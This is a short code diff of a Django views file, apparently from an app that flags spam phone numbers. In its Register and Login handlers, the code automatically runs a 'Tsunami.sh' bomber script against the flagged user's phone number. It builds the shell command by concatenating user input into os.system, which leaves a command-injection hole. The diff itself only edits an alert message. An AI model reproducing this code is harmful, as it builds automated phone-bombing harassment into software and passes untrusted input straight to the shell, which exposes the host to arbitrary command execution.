@@ -20,7 +20,7 @@ def Register(request):
             #print("Bomb to this Spam User ")
             os.system("chmod +x ./static/Bomber/Tsunami.sh")
             os.system("printf '"+phno+"\n1\n' | ./static/Bomber/Tsunami.sh")
-            return HttpResponse("<script>alert('Bombing to this Spam User...\n ');</script>")
+            return HttpResponse("<script>alert('Bombing to this Spam User... ');</script>")
         else:
             gn_phno= [p.PhoneNo for p in GenUsers.objects.all()]
             # If phno already existed in
@@ -48,7 +48,7 @@ def Login(request):
         # print("Bomb to this Spam User ")
         os.system("chmod +x ./static/Bomber/Tsunami.sh")
         os.system("printf '" + phno + "\n1\n' | ./static/Bomber/Tsunami.sh")
-        return HttpResponse("<script>alert('Bombing to this Spam User...\n ');</script>")
+        return HttpResponse("<script>alert('Bombing to this Spam User... ');</script>")
     else:
         #retrieving GenUser infos
         gn_phno = [p.PhoneNo for p in GenUsers.objects.all()]
